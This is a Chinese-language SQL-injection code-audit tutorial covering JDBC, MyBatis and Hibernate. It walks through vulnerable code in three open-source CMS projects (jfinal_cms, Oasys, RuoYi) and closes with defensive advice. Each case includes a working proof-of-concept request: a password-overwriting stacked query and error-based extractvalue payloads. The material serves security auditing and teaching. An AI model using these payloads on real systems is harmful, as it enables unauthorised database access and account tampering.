@@ -1,0 +1,131 @@
+SQL注入漏洞长期以来稳居OWASP Top 10前列，是Web应用最常见的高危漏洞之一。在Java生态中，随着持久层框架的演进，从原生JDBC到MyBatis、Hibernate等ORM框架，SQL注入的写法发生了变化，但核心原理始终不变——将用户输入作为命令代码执行。本文将从理论层面梳理不同框架下的安全与危险写法，并结合三个真实开源CMS案例，演示如何通过代码审计发现SQL注入漏洞。
+
+---
+
+一、理论篇：Java持久层框架与SQL注入
+
+1.1 SQL注入核心原理
+
+当应用程序将用户可控的数据直接拼接到SQL语句中，且未对输入进行充分过滤或转义时，攻击者可以篡改SQL语句的结构，执行任意数据库操作。Java作为强类型语言，对于int、long等数字类型参数，如果直接拼接，框架会自动强转，不易注入；但对于字符串类型，若未预编译，则风险极高。
+
+1.2 三种主流框架的安全与危险写法
+
+框架 安全写法（预编译） 危险写法（拼接） 说明
+JDBC PreparedStatement ps = conn.prepareStatement("SELECT * FROM user WHERE id=?"); ps.setInt(1, id); Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery("SELECT * FROM user WHERE id=" + id); 使用Statement或直接拼接String（+或StringBuilder.append）都是危险的。
+MyBatis #{id} ${id} #{}使用预编译，${}直接替换字符串。注意：LIKE '%${key}%'、ORDER BY ${col}、IN (${ids})、动态表名/列名只能使用${}。
+Hibernate String hql = "FROM User WHERE username = :username"; Query q = session.createQuery(hql); q.setParameter("username", username); String hql = "FROM User WHERE username = '" + username + "'"; Query q = session.createQuery(hql); Hibernate默认使用预编译，但若开发者直接拼接HQL或SQL（createSQLQuery），同样会产生注入。
+
+1.3 审计要点
+
+· 框架识别：通过项目文档、pom.xml依赖、配置文件（如mybatis-config.xml、persistence.xml）确定技术栈。
+· 入口跟踪：从Controller层接收参数开始，跟踪数据流直到DAO层。
+· 关键词搜索：
+  · JDBC：Statement、createStatement、PreparedStatement（检查是否真的使用占位符）、+拼接。
+  · MyBatis：${}，重点排查like、order by、in、动态表名/列名。
+  · Hibernate/JPA：createQuery、createSQLQuery、JpaSort.unsafe()（用于动态排序）。
+· 预编译完整性：确认所有用户输入都通过占位符传递，且对于必须拼接的部分（如排序字段）有白名单校验。
+
+---
+
+二、实战案例：三步挖掘SQL注入
+
+案例1：Jfinal_cms论坛系统（非框架JDBC拼接）
+
+项目：jfinal_cms
+审计过程：
+
+1. 框架识别：项目基于JFinal框架，但数据库操作未使用ORM，直接使用JDBC的Db.query系列方法。
+2. 关键词搜索：搜索order by + append，定位到/src/main/java/com/jflyfox/modules/admin/advicefeedback/AdviceFeedbackController.java中的list方法。
+   ```java
+   String orderBy = getBaseForm().getOrderBy(); // 用户可控
+   String orderColumn = getOrderColumn(orderBy); // 简单提取列名
+   StringBuilder sql = new StringBuilder("select * from advice_feedback where 1=1 ");
+   // ... 其他条件
+   sql.append(" order by ").append(orderBy); // 直接拼接
+   ```
+3. 调用链：/admin/advicefeedback/list (POST) → getBaseForm().getOrderBy() → 拼接进SQL。
+4. 漏洞验证：参数form.orderColumn可控制orderBy，构造POC：
+   ```
+   POST /admin/advicefeedback/list
+   form.orderColumn=id';update user set password=123 where id=1;-- 
+   ```
+   （实际利用可配合报错注入或时间盲注）
+
+根源：未使用预编译，直接拼接用户传入的排序字段。
+
+---
+
+案例2：Oasys办公系统（SpringBoot+MyBatis LIKE拼接）
+
+项目：oa_system
+审计过程：
+
+1. 框架识别：pom.xml包含mybatis-spring-boot-starter，为MyBatis框架。
+2. 关键词搜索：搜索${，定位到/src/main/resources/mapper/NoticeMapper.xml：
+   ```xml
+   <select id="findInformByPaging" parameterType="map" resultMap="noticeResultMap">
+       SELECT * FROM oa_inform WHERE 1=1
+       <if test="baseKey!=null and baseKey!=''">
+           AND n.title LIKE '%${baseKey}%'   <!-- 危险拼接 -->
+       </if>
+   </select>
+   ```
+3. 调用链：InformController中的informlistPaging方法接收baseKey参数，直接传递给noticeService.sortMyNotice，最终进入Mapper。
+4. 漏洞验证：
+   ```
+   POST /informlistpaging
+   baseKey=%' or 1=1 and extractvalue(1,concat(0x7e,(select user()),0x7e))#
+   ```
+
+根源：MyBatis中LIKE查询错误使用了${}，导致预编译失效。正确做法是使用CONCAT('%',#{baseKey},'%')。
+
+---
+
+案例3：Ruoyi若依系统 V4.6（MyBatis IN条件拼接）
+
+项目：RuoYi
+审计过程：
+
+1. 框架识别：明显SpringBoot+MyBatis组合。
+2. 关键词搜索：搜索${，定位到/src/main/resources/mapper/system/SysDeptMapper.xml：
+   ```xml
+   <update id="updateDeptStatus" parameterType="SysDept">
+       UPDATE sys_dept SET status = #{status} WHERE dept_id IN (${ancestors})
+   </update>
+   ```
+   ancestors参数在SysDept实体中，由前端传入。
+3. 调用链：/system/dept/edit (POST) → SysDeptController.editSave() → deptService.updateDept() → deptMapper.updateDeptStatus()。ancestors来自表单参数。
+4. 漏洞验证：
+   ```
+   POST /system/dept/edit
+   ancestors=0)or(extractvalue(1,concat((select user()))))#&DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1
+   ```
+   （该POC利用MySQL报错注入，需确认数据库类型）
+
+根源：MyBatis中IN条件直接拼接${ancestors}，攻击者可注入恶意SQL。正确做法是遍历集合使用#{item}。
+
+---
+
+三、审计方法论总结
+
+1. 预编译是底线：任何拼接用户输入的地方都可能存在漏洞，优先使用#{}、PreparedStatement占位符。
+2. 无法预编译的场景需严格过滤：
+   · LIKE：使用数据库函数拼接占位符，如CONCAT('%', #{key}, '%')。
+   · ORDER BY：使用白名单，如只允许传入预设的列名数组索引，或使用CASE WHEN转换。
+   · IN：动态拼接多个占位符（如#{item1},#{item2}）或使用<foreach>。
+   · 表名/列名：同样使用白名单校验。
+3. 框架特性要熟知：Hibernate的JpaSort.unsafe()、JPA的EntityManager.createNativeQuery都可能绕过预编译。
+4. 代码审计工具辅助：可结合FindSecBugs、Fortify等工具扫描，但需人工验证上下文。
+
+---
+
+四、防御建议
+
+· 开发规范：强制使用预编译接口，禁止SQL字符串拼接。
+· 代码审查：定期针对持久层进行专项审计，重点关注${}、Statement、createSQLQuery等关键词。
+· 安全测试：在CI/CD流程中集成SQL注入自动化检测工具，并结合人工渗透测试。
+· 最小权限原则：数据库连接账户仅赋予必要权限，降低漏洞影响。
+
+---
+
+SQL注入作为“老牌”漏洞，在Java框架的演进中依然时有发生。开发者需深入理解框架原理，审计人员则应掌握不同场景下的挖掘技巧。通过理论结合实战，我们才能真正筑牢应用安全防线。
